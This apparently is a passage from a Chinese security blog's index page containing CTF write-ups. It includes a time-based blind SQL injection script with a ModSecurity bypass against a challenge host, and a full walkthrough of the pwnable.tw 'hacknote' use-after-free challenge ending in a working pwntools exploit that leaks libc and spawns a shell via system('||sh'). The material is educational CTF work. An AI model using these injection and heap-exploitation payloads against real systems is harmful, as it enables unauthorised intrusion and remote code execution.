<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    </span><br><span class="line">    res = <span class="string">'flag&#123;abypass_modsecurity'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">'''GET /?age=1%20or%201%20and%20ascii(substr((select%20*%20from%20flag_xdd),&#123;&#125;,1))=&#123;&#125;%20and%20sleep(0.7) HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 111.186.57.43:10601</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span>.format(str(i), str(j))</span><br><span class="line">            exp = payload.encode().replace(<span class="string">b'\n'</span>, <span class="string">b'\r\n'</span>)</span><br><span class="line">            <span class="comment"># print(exp)</span></span><br><span class="line">            <span class="keyword">if</span> send_raw(exp):</span><br><span class="line">                res += chr(j)</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/19/hacknote/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/11/19/hacknote/" class="post-title-link" itemprop="url">hacknote</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-11-19 08:28:33" itemprop="dateCreated datePublished" datetime="2019-11-19T08:28:33-08:00">2019-11-19</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-11-20 00:29:06" itemprop="dateModified" datetime="2019-11-20T00:29:06-08:00">2019-11-20</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p>
<p>首先检查一下程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share/攻防世界PWN/hacknote$ checksec hacknote</span><br><span class="line">[*] &apos;/mnt/hgfs/share/\xe6\x94\xbb\xe9\x98\xb2\xe4\xb8\x96\xe7\x95\x8cPWN/hacknote/hacknote&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>然后用IDA Pro检查一下程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = atoi(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Delete_note();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        Print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      Add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot; 1. Add note          &quot;);</span><br><span class="line">puts(&quot; 2. Delete note       &quot;);</span><br><span class="line">puts(&quot; 3. Print note        &quot;);</span><br><span class="line">puts(&quot; 4. Exit              &quot;);</span><br></pre></td></tr></table></figure>

<p>故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。</p>
<h4 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h4><p>根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">unsigned int sub_8048646()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // ebx</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf; // [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( dword_804A04C &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[i] = malloc(8u);</span><br><span class="line">        if ( !ptr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)ptr[i] = sub_804862B;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = ptr[i];</span><br><span class="line">        v0[1] = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)ptr[i] + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)ptr[i] + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++dword_804A04C;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h4><p>print_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">    notelist[v1]-&gt;put(notelist[v1]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h4><p>delete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int del_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(notelist[v1]-&gt;content);</span><br><span class="line">    free(notelist[v1]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到<strong>UAF</strong>的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个<strong>magic</strong>函数，我们有没有可能来通过<strong>UAF</strong>来使得这个程序执行 <strong>magic</strong> 函数呢？<strong>一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</strong> 那么该怎么执行呢？                                                                         </p>
<p>我们可以简单来看一下每一个 <strong>note</strong> 生成的具体流程</p>
<ol>
<li><p>程序申请 8 字节内存用来存放 <strong>note</strong> 中的 <strong>put</strong> 以及 <strong>content</strong> 指针</p>
</li>
<li><p>程序根据输入的 size 来申请指定大小的内存，然后用来存储 <strong>content</strong></p>
<p>基本的思路是先add 两次，但是内容的大小不能是8字节，不然会分配 4个16字节的fast bin，那我们就没办法进行UAF，所以分配content的大小必须不是8字节，然后再delete两次，此时 fastbin链表</p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">note1 结构体</th>
<th align="center">16 bytes（8B)</th>
<th align="center">high address</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>note1 content</strong></td>
<td align="center"><strong>32 bytes（16B)</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>note0 结构体</strong></td>
<td align="center"><strong>16 bytes（8B)</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>note0 content</strong></td>
<td align="center"><strong>32 bytes（16B)</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>fastbin head</strong></td>
<td align="center"></td>
<td align="center"><strong>low address</strong></td>
</tr>
</tbody></table>
<p>由于题目提供了<strong>libc</strong>，我们可以先触发一次漏洞来泄露地址，然后再触发一次漏洞来执行system</p>
<p>这里有个问题就是<strong>system</strong>函数的参数，原来的<strong>printf</strong>函数传入的是指向结构体的指针，那么此时system传入该函数的参数就是<strong>note0</strong>结构体自身，无法直接传如字符串“<strong>\bin\sh</strong>”，这里的知识点是<strong>system</strong>参数可用“||”截断，比如 <strong>system(“hsasoijiojo||/bin/sh”)</strong></p>
<p>我们来调试一下</p>
<p>当我们进行第一次add note的时候</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0xc5</span> bytes:</span><br><span class="line">    '----------------------\n'</span><br><span class="line">    '       HackNote       \n'</span><br><span class="line">    '----------------------\n'</span><br><span class="line">    ' 1. Add note          \n'</span><br><span class="line">    ' 2. Delete note       \n'</span><br><span class="line">    ' 3. Print note        \n'</span><br><span class="line">    ' 4. Exit              \n'</span><br><span class="line">    '----------------------\n'</span><br><span class="line">    'Your choice :'</span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    '1\n'</span><br><span class="line">[DEBUG] Received <span class="number">0xb</span> bytes:</span><br><span class="line">    'Note size :'</span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    '32\n'</span><br><span class="line">[DEBUG] Received <span class="number">0x9</span> bytes:</span><br><span class="line">    'Content :'</span><br><span class="line">[DEBUG] Sent <span class="number">0x8</span> bytes:</span><br><span class="line">    <span class="string">'a'</span> * <span class="number">0x8</span></span><br><span class="line">[DEBUG] Received <span class="number">0xa</span> bytes:</span><br><span class="line">    'Success !\n'</span><br></pre></td></tr></table></figure>

<p>查看堆的情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x9d9b008</span> PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">337</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x9d9b158</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">17</span>, </span><br><span class="line">  fd = <span class="number">0x804862b</span>, </span><br><span class="line">  bk = <span class="number">0x9d9b170</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x31</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x9d9b168</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">49</span>, </span><br><span class="line">  fd = <span class="number">0x61616161</span>, </span><br><span class="line">  bk = <span class="number">0x61616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现已经分配了一个大小为17的chunk（即note0的结构体），和一个大小为49的chunk（即note0的content），note1同理</p>
<p>当删除的时候fastbin列表就像我们设想的那样，这里有一个坑，如果是本地调试的话，tcache是libc2.26之后引进的一种新机制，类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap bins</span><br><span class="line">───────────────────────────────────────────────────────────[ Fastbins <span class="keyword">for</span> arena <span class="number">0xf7fac780</span> ]───────────────────────────────────────────────────────────</span><br><span class="line">Fastbins[idx=<span class="number">0</span>, size=<span class="number">0x8</span>]  ←  UsedChunk(addr=<span class="number">0x804b040</span>, size=<span class="number">0x10</span>)  ←  UsedChunk(addr=<span class="number">0x804b008</span>, size=<span class="number">0x10</span>) </span><br><span class="line">Fastbins[idx=<span class="number">1</span>, size=<span class="number">0xc</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">2</span>, size=<span class="number">0x10</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">3</span>, size=<span class="number">0x14</span>]  ←  UsedChunk(addr=<span class="number">0x804b050</span>, size=<span class="number">0x28</span>)  ←  UsedChunk(addr=<span class="number">0x804b018</span>, size=<span class="number">0x28</span>) </span><br><span class="line">Fastbins[idx=<span class="number">4</span>, size=<span class="number">0x18</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x1c</span>] <span class="number">0x00</span></span><br><span class="line">Fastbins[idx=<span class="number">6</span>, size=<span class="number">0x20</span>] <span class="number">0x00</span></span><br></pre></td></tr></table></figure>

<p>最终的EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process('./hacknote')</span></span><br><span class="line">sh=remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10102</span>)</span><br><span class="line">elf=ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">addnote(<span class="number">0x20</span>,<span class="string">'aaaaaaaa'</span>) <span class="comment">#idx0</span></span><br><span class="line">addnote(<span class="number">0x20</span>,<span class="string">'aaaaaaaa'</span>) <span class="comment">#idx1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">fun=<span class="number">0x0804862B</span></span><br><span class="line">addnote(<span class="number">0x8</span>,p32(fun)+p32(puts_got)) </span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">puts_adr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_adr: '</span>+hex(puts_adr)</span><br><span class="line">libc_base=puts_adr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base: '</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">system_adr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line">payload=p32(system_adr)+<span class="string">'||sh'</span></span><br><span class="line">addnote(<span class="number">0x8</span>,payload)</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/16/CTF-PWN-Tips-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/11/16/CTF-PWN-Tips-1/" class="post-title-link" itemprop="url">CTF-PWN-Tips-1</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-11-16 19:25:34" itemprop="dateCreated datePublished" datetime="2019-11-16T19:25:34-08:00">2019-11-16</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-11-17 11:25:52" itemprop="dateModified" datetime="2019-11-17T11:25:52-08:00">2019-11-17</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
